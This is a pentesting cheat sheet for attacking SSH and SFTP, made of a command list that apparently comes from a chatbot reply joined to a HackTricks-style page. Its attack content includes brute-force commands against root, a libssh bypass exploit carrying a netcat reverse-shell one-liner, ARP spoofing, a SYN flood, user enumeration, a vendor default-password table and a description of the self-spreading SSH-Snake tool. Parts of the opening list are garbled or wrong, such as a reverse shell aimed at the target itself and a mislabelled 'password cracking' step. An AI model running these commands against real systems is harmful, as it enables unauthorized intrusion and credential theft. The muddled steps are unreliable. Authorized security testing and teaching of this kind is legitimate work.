# 22 - Pentesting SSH/SFTP

ere is a complete list of penetration testing test cases for the SSH (Secure Shell) service, including test case names and associated commands:

# Enum SSH
# Get version
nmap 10.11.1.1 -p22 -sV
# Get banner
nc 10.11.1.1 22
# Get login banner
ssh root@10.11.11.1
# Get algorythms supporteed
nmap -p22 10.11.1.1 --script ssh2-enum-algos
# Check weak keys
nmap-p22 10.2.1.1 --script ssh-hostkey --script-args ssh_hostkey=full
# Check auth methods
nmap -p22 10.11.1.1 --script ssh-auth-methods --script-args="ssh.user=admin"

# User can ask to execute a command right after authentication before it‚Äôs default command or shell is executed
$ ssh -v user@10.10.1.111 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 10.10.1.111 ([10.10.1.1114]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(user) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

# Check Auth Methods:
$ ssh -v 10.10.1.111
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

# Force Auth Method:
$ ssh -v 10.10.1.111 -o PreferredAuthentications=password
...
debug1: Next authentication method: password

# BruteForce:
patator ssh_login host=10.11.1.111 port=22 user=root 0=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt password=FILE0 -x ignore:mesg='Authentication failed.'
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111
medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111

# LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
# Id
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 id
# Reverse
python /usr/share/exploitdb/exploits/linux/remote/46307.py 10.10.1.111 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.1.111 80 >/tmp/f"

# SSH FUZZ
# https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt

# cpan Net::SSH2
./sshfuzz.pl -H 10.10.1.111 -P 22 -u user -p user

use auxiliary/fuzzers/ssh/ssh_version_2

# SSH-AUDIT
# https://github.com/arthepsy/ssh-audit                     

# Enum users < 7.7:
# https://www.exploit-db.com/exploits/45233
https://github.com/CaioCGH/EP4-redes/blob/master/attacker/sshUsernameEnumExploit.py
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null | grep "is a"

# SSH Leaks:
https://shhgit.darkport.co.uk/

# SSH bruteforce
# https://github.com/kitabisa/ssb


1. Service Enumeration
Command:
nmap -sV -p 22 <target_ip>
	‚Ä¢ Scans port 22 to identify the SSH service and its version.

2. Banner Grabbing
Command:
nmap -p 22 --script=ssh-banner <target_ip>
	‚Ä¢ Grabs the banner from the SSH service to get version and configuration information.

3. Check for Default SSH Configuration
Command:
ssh -v <target_ip>
	‚Ä¢ Connects to the SSH server with verbose mode enabled to inspect the default SSH configuration.

4. Brute Force SSH Authentication
Command:
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
	‚Ä¢ Uses Hydra to perform a brute-force attack against the SSH service with a wordlist to crack the password for a given username.

5. SSH Password Cracking
Command:
ssh-keygen -f /tmp/ssh_key -P "" -t rsa
ssh -i /tmp/ssh_key <username>@<target_ip>
	‚Ä¢ Tries using a passwordless SSH key to authenticate, attempting to crack password-based authentication with key-based login.

6. Check for Weak SSH Passwords
Command:
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>
	‚Ä¢ Uses Hydra to perform a brute-force attack to check for weak passwords on the root user.

7. Check for SSH Root Login Access
Command:
ssh root@<target_ip>
	‚Ä¢ Tests if the SSH service allows login as the root user, which is often disabled for security.

8. SSH Key-Based Authentication Test
Command:
ssh -i /path/to/private_key <username>@<target_ip>
	‚Ä¢ Attempts to login using SSH key-based authentication to check for potential key-based access vulnerabilities.

9. Check for SSH Service Exposure (Public Accessibility)
Command:
nmap -p 22 --open <target_ip>
	‚Ä¢ Scans for open SSH ports (22) to verify if the service is exposed to the public or internal network.

10. SSH Banner Information Disclosure
Command:
ssh -v <target_ip>
	‚Ä¢ Uses verbose mode to connect to SSH and checks for any sensitive information disclosed in the SSH banner.

11. Check for SSH Misconfigurations (e.g., Weak Encryption, Protocol Version)
Command:
nmap --script=ssh2-enum-algos -p 22 <target_ip>
	‚Ä¢ Uses Nmap to enumerate SSH algorithms and configurations, which helps detect weak encryption protocols or outdated SSH versions.

12. Test for SSH Idle Timeout Configuration
Command:
ssh <username>@<target_ip>
(Leave session idle and observe timeout behavior)
	‚Ä¢ Tests if the SSH service has proper idle timeout configuration to prevent idle sessions from consuming resources.

13. Check for SSH Access Control Configuration (Allow/Deny Users)
Command:
ssh <username>@<target_ip>
(Attempt to login with different users to test the SSH access control rules)
	‚Ä¢ Tests whether the SSH service has proper configuration in place to control which users can or cannot log in.

14. SSH Man-in-the-Middle (MITM) Attack Test
Command:
arpspoof -i eth0 -t <target_ip> <gateway_ip>
	‚Ä¢ Performs ARP spoofing to intercept SSH traffic and check if an MITM attack is possible due to insecure key exchange.

15. Test for SSH Version Disclosure (Banner Grabbing)
Command:
ssh -v <target_ip>
	‚Ä¢ Attempts to grab the SSH banner to reveal its version number, which could be vulnerable to known exploits.

16. Test for SSH Forwarding/Port Forwarding Configuration
Command:
ssh -L <local_port>:<target_ip>:<remote_port> <username>@<target_ip>
	‚Ä¢ Tests if SSH port forwarding is misconfigured, potentially allowing attackers to bypass firewalls.

17. Check for SSH Log Files Configuration
Command:
cat /var/log/auth.log | grep sshd
	‚Ä¢ Checks the SSH logs for any misconfigurations or improper logging that could disclose sensitive data.

18. SSH Host Key Checking Vulnerability (MITM Testing)
Command:
ssh -o StrictHostKeyChecking=no <username>@<target_ip>
	‚Ä¢ Disables strict host key checking to test if an attacker can perform an MITM attack and impersonate the SSH server.

19. Test for SSH Agent Forwarding Misconfiguration
Command:
ssh -A <username>@<target_ip>
	‚Ä¢ Tests if SSH agent forwarding is misconfigured and can be used to forward authentication credentials to other systems.

20. Check for SSH Session Hijacking Vulnerability
Command:
tcpdump -i eth0 port 22
	‚Ä¢ Captures SSH traffic to check for potential session hijacking due to weak session handling or improper configurations.

21. SSH Idle Session Management (Denial of Service)
Command:
ssh <username>@<target_ip>
(Keep a session open and observe if idle sessions can lead to resource exhaustion or DoS)
	‚Ä¢ Tests if idle SSH sessions can cause resource exhaustion or denial of service due to improper session handling.

22. Test for SSH Weak Algorithms and Cipher Suites
Command:
nmap --script=ssh2-enum-algos -p 22 <target_ip>
	‚Ä¢ Uses Nmap to check for weak encryption algorithms, such as outdated ciphers or deprecated protocols that could be vulnerable.

23. Test for SSH Tunneling/Reverse Tunneling
Command:
ssh -R <remote_port>:localhost:<local_port> <username>@<target_ip>
	‚Ä¢ Tests if SSH reverse tunneling is enabled and can be used to bypass firewalls or access internal services.

24. Test for SSH Service Denial (Flooding)
Command:
hping3 --syn -p 22 --flood <target_ip>
	‚Ä¢ Floods the SSH service with SYN packets to check if it is vulnerable to a Denial of Service (DoS) attack.

25. Check for SSH Public Key Authentication Configuration
Command:
ssh -i /path/to/private_key <username>@<target_ip>
	‚Ä¢ Attempts to log in using SSH public key authentication to ensure proper configuration and prevent unauthorized access.

These are key penetration testing test cases for the SSH service. Let me know if you need further details or clarification on any of the test cases!

Common Testcase Names:

	1. SSH Banner Grabbing
	2. SSH Version Detection
	3. Brute Force Attack on SSH Credentials
	4. Testing for Weak Passwords on SSH
	5. SSH Key-Based Authentication Bypass
	6. Testing for SSH Anonymous Login
	7. SSH Login Lockout/Rate Limiting Test
	8. SSH Login Attempt with Common Usernames
	9. Testing for SSH Misconfiguration (e.g., PermitRootLogin)
	10. SSH Command Injection Vulnerability
	11. SSH Public Key Authentication Security
	12. SSH Key Length and Algorithm Strength Test
	13. Testing for Weak SSH Host Key Algorithms
	14. Testing SSH for Known Vulnerabilities (CVE Database)
	15. SSH Session Hijacking Test
	16. Exploitation of SSH Weak Encryption Algorithms
	17. SSH Port Scanning and Service Discovery
	18. Testing for SSH Forwarding Vulnerabilities
	19. SSH Tunneling and Port Forwarding Abuse
	20. Testing for SSH Agent Forwarding Misconfigurations
	21. SSH Connection Time Analysis and Fingerprinting
	22. SSH Response to Invalid Commands
	23. SSH Key Permissions and Ownership Checks
	24. SSH Session Timeout Test
	25. SSH File Upload/Download Vulnerabilities
	26. Testing for SSH Access Control Misconfigurations
	27. SSH Server Response to Invalid Username
	28. SSH Client and Server Compatibility Issues
	29. Testing for SSH Version Downgrade Attack
	30. SSH Keep-Alive Mechanism Abuse
	31. SSH Security Header Check
	32. SSH Protocol Downgrade Attack
	33. SSH Public Key Disclosure or Insecure Storage
	34. SSH Private Key Leak Test
	35. Testing SSH for Known Exploits (CVE Identification)
	36. SSH File Integrity and Permissions Test
	37. SSH Path Disclosure Vulnerabilities
	38. Testing for SSH Weak Cipher Suites
	39. Access Control and Privilege Escalation via SSH
	40. SSH Configurations and Permission Hardening Test
	41. Testing for SSH Agent Bypasses
	42. SSH Client Configuration Review for Security
	43. SSH Server Misconfiguration Check (e.g., AllowUsers/AllowGroups)
	44. SSH Access Logs Review for Information Disclosure
	45. SSH Key Rotation and Expiry Test
	46. SSH Service Denial of Service (DoS) Attack
	47. Testing SSH for Timing and Response Delays
	48. SSH Connection Interception and Man-in-the-Middle Test
	49. SSH Tunnel Throughfirewall Test
Testing for SSH Client-Side Vulnerabilities

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

**SSH (Secure Shell or Secure Socket Shell)** is a network protocol that enables a secure connection to a computer over an unsecured network. It is essential for maintaining the confidentiality and integrity of data when accessing remote systems.

**Default port:** 22

```
22/tcp open  ssh     syn-ack
```

**SSH servers:**

* [openSSH](http://www.openssh.org) ‚Äì OpenBSD SSH, shipped in BSD, Linux distributions and Windows since Windows 10
* [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) ‚Äì SSH implementation for environments with low memory and processor resources, shipped in OpenWrt
* [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) ‚Äì SSH implementation for Windows, the client is commonly used but the use of the server is rarer
* [CopSSH](https://www.itefix.net/copssh) ‚Äì implementation of OpenSSH for Windows

**SSH libraries (implementing server-side):**

* [libssh](https://www.libssh.org) ‚Äì multiplatform C library implementing the SSHv2 protocol with bindings in [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) and [R](https://github.com/ropensci/ssh); it‚Äôs used by KDE for sftp and by GitHub for the git SSH infrastructure
* [wolfSSH](https://www.wolfssl.com/products/wolfssh/) ‚Äì SSHv2 server library written in ANSI C and targeted for embedded, RTOS, and resource-constrained environments
* [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) ‚Äì Apache SSHD java library is based on Apache MINA
* [paramiko](https://github.com/paramiko/paramiko) ‚Äì Python SSHv2 protocol library

## Enumeration

### Banner Grabbing

```bash
nc -vn <IP> 22
```

### Automated ssh-audit

ssh-audit is a tool for ssh server & client configuration auditing.

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit) is an updated fork from [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/)

**Features:**

* SSH1 and SSH2 protocol server support;
* analyze SSH client configuration;
* grab banner, recognize device or software and operating system, detect compression;
* gather key-exchange, host-key, encryption and message authentication code algorithms;
* output algorithm information (available since, removed/disabled, unsafe/weak/legacy, etc);
* output algorithm recommendations (append or remove based on recognized software version);
* output security information (related issues, assigned CVE list, etc);
* analyze SSH version compatibility based on algorithm information;
* historical information from OpenSSH, Dropbear SSH and libssh;
* runs on Linux and Windows;
* no dependencies

```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

   -1,  --ssh1             force ssh version 1 only
   -2,  --ssh2             force ssh version 2 only
   -4,  --ipv4             enable IPv4 (order of precedence)
   -6,  --ipv6             enable IPv6 (order of precedence)
   -p,  --port=<port>      port to connect
   -b,  --batch            batch output
   -c,  --client-audit     starts a server on port 2222 to audit client
                               software config (use -p to change port;
                               use -t to change timeout)
   -n,  --no-colors        disable colors
   -j,  --json             JSON output
   -v,  --verbose          verbose output
   -l,  --level=<level>    minimum output level (info|warn|fail)
   -t,  --timeout=<secs>   timeout (in seconds) for connection and reading
                               (default: 5)
$ python3 ssh-audit <IP>
```

[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### Public SSH key of server

```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```

### Weak Cipher Algorithms

This is discovered by default by **nmap**. But you can also use **sslcan** or **sslyze**.

### Nmap scripts

```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```

### Shodan

* `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

In some versions of OpenSSH you can make a timing attack to enumerate users. You can use a metasploit module in order to exploit this:

```
msf> use scanner/ssh/ssh_enumusers
```

### [Brute force](../generic-hacking/brute-force.md#ssh)

Some common ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) and below.

### Private Key Brute Force

If you know some ssh private keys that could be used... let's try it. You can use the nmap script:

```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```

Or the MSF auxiliary module:

```
msf> use scanner/ssh/ssh_identify_pubkeys
```

Or use `ssh-keybrute.py` (native python3, lightweight and has legacy algorithms enabled): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### Known badkeys can be found here:

{% embed url="https://github.com/rapid7/ssh-badkeys/tree/master/authorized" %}

#### Weak SSH keys / Debian predictable PRNG

Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced. Pre-generated sets of keys generated on Debian systems affected by weak PRNG are available here: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

You should look here in order to search for valid keys for the victim machine.

### Kerberos

**crackmapexec** using the `ssh` protocol can use the option `--kerberos` to **authenticate via kerberos**.\
For more info run `crackmapexec ssh --help`.

## Default Credentials

| **Vendor** | **Usernames**                                                                                               | **Passwords**                                                                                                                                                                                              |
| ---------- | ----------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                        |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                      |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, \_Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change\_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                       |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                       |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                         |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                              |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc\_op                                                    | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC\_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                             |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                               |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                  |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                  |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                      |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                           |

## SSH-MitM

If you are in the local network as the victim which is going to connect to the SSH server using username and password you could try to **perform a MitM attack to steal those credentials:**

**Attack path:**

* **Traffic Redirection:** The attacker **diverts** the victim's traffic to their machine, effectively **intercepting** the connection attempt to the SSH server.
* **Interception and Logging:** The attacker's machine acts as a **proxy**, **capturing** the user's login details by pretending to be the legitimate SSH server.
* **Command Execution and Relay:** Finally, the attacker's server **logs the user's credentials**, **forwards the commands** to the real SSH server, **executes** them, and **sends the results back** to the user, making the process appear seamless and legitimate.

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) does exactly what is described above.

In order to capture perform the actual MitM you could use techniques like ARP spoofing, DNS spoofin or others described in the [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/#spoofing).

## SSH-Snake

If you want to traverse a network using discovered SSH private keys on systems, utilizing each private key on each system for new hosts, then [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) is what you need.

SSH-Snake performs the following tasks automatically and recursively:

1. On the current system, find any SSH private keys,
2. On the current system, find any hosts or destinations (user@host) that the private keys may be accepted,
3. Attempt to SSH into all of the destinations using all of the private keys discovered,
4. If a destination is successfully connected to, repeats steps #1 - #4 on the connected-to system.

It's completely self-replicating and self-propagating -- and completely fileless.

## Config Misconfigurations

### Root login

It's common for SSH servers to allow root user login by default, which poses a significant security risk. **Disabling root login** is a critical step in securing the server. Unauthorized access with administrative privileges and brute force attacks can be mitigated by making this change.

**To Disable Root Login in OpenSSH:**

1. **Edit the SSH config file** with: `sudoedit /etc/ssh/sshd_config`
2. **Change the setting** from `#PermitRootLogin yes` to **`PermitRootLogin no`**.
3. **Reload the configuration** using: `sudo systemctl daemon-reload`
4. **Restart the SSH server** to apply changes: `sudo systemctl restart sshd`

### SFTP Brute Force

* [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

There is a common oversight occurs with SFTP setups, where administrators intend for users to exchange files without enabling remote shell access. Despite setting users with non-interactive shells (e.g., `/usr/bin/nologin`) and confining them to a specific directory, a security loophole remains. **Users can circumvent these restrictions** by requesting the execution of a command (like `/bin/bash`) immediately after logging in, before their designated non-interactive shell takes over. This allows for unauthorized command execution, undermining the intended security measures.

[Example from here](https://community.turgensec.com/ssh-hacking-guide/):

```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```

Here is an example of secure SFTP configuration (`/etc/ssh/sshd_config` ‚Äì openSSH) for the user `noraj`:

```
Match User noraj
        ChrootDirectory %h
        ForceCommand internal-sftp
        AllowTcpForwarding no
        PermitTunnel no
        X11Forwarding no
        PermitTTY no
```

This configuration will allow only SFTP: disabling shell access by forcing the start command and disabling TTY access but also disabling all kind of port forwarding or tunneling.

### SFTP Tunneling

If you have access to a SFTP server you can also tunnel your traffic through this for example using the common port forwarding:

```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```

### SFTP Symlink

The **sftp** have the command "**symlink**". Therefor, if you have **writable rights** in some folder, you can create **symlinks** of **other folders/files**. As you are probably **trapped** inside a chroot this **won't be specially useful** for you, but, if you can **access** the created **symlink** from a **no-chroot** **service** (for example, if you can access the symlink from the web), you could **open the symlinked files through the web**.

For example, to create a **symlink** from a new file **"**_**froot**_**" to "**_**/**_**"**:

```bash
sftp> symlink / froot
```

If you can access the file "_froot_" via web, you will be able to list the root ("/") folder of the system.

### Authentication methods

On high security environment it‚Äôs a common practice to enable only key-based or two factor authentication rather than the simple factor password based authentication. But often the stronger authentication methods are enabled without disabling the weaker ones. A frequent case is enabling `publickey` on openSSH configuration and setting it as the default method but not disabling `password`. So by using the verbose mode of the SSH client an attacker can see that a weaker method is enabled:

```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```

For example if an authentication failure limit is set and you never get the chance to reach the password method, you can use the `PreferredAuthentications` option to force to use this method.

```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```

Review the SSH server configuration is necessary to check that only expected\
methods are authorized. Using the verbose mode on the client can help to see\
the effectiveness of the configuration.

### Config files

```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```

## Fuzzing

* [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
* [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh\_version\_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## References

* You can find interesting guides on how to harden SSH in [https://www.ssh-audit.com/hardening\_guides.html](https://www.ssh-audit.com/hardening_guides.html)
* [https://community.turgensec.com/ssh-hacking-guide](https://community.turgensec.com/ssh-hacking-guide)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## HackTricks Automatic Commands

```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
  Name: Hydra Brute Force
  Description: Need Username
  Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh
   
Entry_2:
  Name: consolesless mfs enumeration
  Description: SSH enumeration without the need to run msfconsole
  Note: sourced from https://github.com/carlospolop/legion
  Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'
   
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
